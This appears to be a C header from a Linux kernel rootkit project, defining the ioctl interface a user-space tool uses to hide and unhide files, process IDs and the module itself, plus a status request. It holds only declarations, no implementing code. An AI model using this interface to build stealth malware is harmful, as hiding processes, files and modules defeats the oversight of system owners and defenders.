#ifndef COMMON_H
#define COMMON_H

#ifdef __KERNEL__
#include <linux/ioctl.h>

struct kernmod_status_request {
    char __user *buf;  
    size_t buf_size;   
    size_t out_len;
};
#else
#include <sys/ioctl.h>

struct kernmod_status_request {
    char *buf;
    size_t buf_size;
    size_t out_len;
};
#endif

#define IOCTL_MAGIC 'k'

#define MAX_MODULE_NAME 64
#define MAX_HIDDEN_NAME 256
#define MAX_PID_STR     32

#define IOCTL_HIDE_FILE     _IOW(IOCTL_MAGIC, 0, char[MAX_HIDDEN_NAME])
#define IOCTL_UNHIDE_FILE   _IOW(IOCTL_MAGIC, 1, char[MAX_HIDDEN_NAME])
#define IOCTL_HIDE_PID      _IOW(IOCTL_MAGIC, 2, char[MAX_PID_STR])
#define IOCTL_UNHIDE_PID    _IOW(IOCTL_MAGIC, 3, char[MAX_PID_STR])
#define IOCTL_HIDE_MODULE   _IOW(IOCTL_MAGIC, 4, char[MAX_HIDDEN_NAME])
#define IOCTL_UNHIDE_MODULE _IOW(IOCTL_MAGIC, 5, char[MAX_HIDDEN_NAME])
#define IOCTL_GET_STATUS    _IOWR(IOCTL_MAGIC, 6, struct kernmod_status_request)

#endif